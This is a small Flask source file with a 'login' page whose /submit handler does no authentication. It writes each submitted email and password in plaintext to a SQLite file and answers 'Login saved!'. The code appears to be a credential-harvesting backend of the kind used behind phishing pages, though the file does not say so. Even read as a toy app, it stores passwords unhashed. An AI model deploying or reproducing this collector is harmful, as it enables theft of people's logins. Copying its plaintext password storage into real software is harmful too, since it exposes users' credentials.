from flask import Flask, request, render_template
import sqlite3
import os

app = Flask(__name__)

DB_PATH = "/data/users.db"

# ✅ Home route
@app.route('/')
def index():
    return render_template("login.html")

@app.route('/submit', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (email TEXT, password TEXT)")
    c.execute("INSERT INTO users (email, password) VALUES (?, ?)", (email, password))
    conn.commit()
    conn.close()
    return "Login saved!"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
